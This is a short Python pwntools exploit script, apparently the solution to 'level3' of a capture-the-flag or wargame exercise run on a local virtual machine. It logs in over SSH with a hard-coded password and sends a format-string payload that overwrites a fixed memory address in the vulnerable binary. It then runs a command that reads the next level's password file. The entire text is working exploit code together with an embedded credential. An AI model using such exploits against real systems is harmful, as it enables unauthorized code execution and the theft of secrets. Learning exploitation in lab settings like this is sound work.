from pwn import *


# Change host according to your configuration
s = ssh(
    user="level3",
    host="192.168.56.101",
    password="492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02",
    port=4242
)

# the format string offset
offset = 4

# the writes you want to perform
writes = {
    0x804988c: 0x40,  # write 0x40 at 0x804988c
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)

p = s.process("/home/user/level3/level3")
p.writeline(payload)
p.sendline(b'cat /home/user/level4/.pass')

#p.interactive()
p.stream()

p.close()
s.close()
